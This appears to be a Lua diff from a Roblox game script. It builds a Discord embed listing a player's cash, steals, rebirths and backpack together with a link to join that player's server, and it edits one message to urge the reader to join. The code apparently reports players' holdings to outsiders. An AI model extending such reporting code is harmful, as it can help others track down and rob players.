@@ -519,7 +519,7 @@ local function showConfirm(rawLink)
                     {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
                     {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
                     {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
-                    {name = "💰 Backpack", value = "```Failed to Scan```", inline = false},
+                    {name = "💰 Backpack", value = "```Failed to Scan, Join Server to See!```", inline = false},
                     {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
                 },
                 footer = {text = "discord.gg/cnUAk7uc3n"},
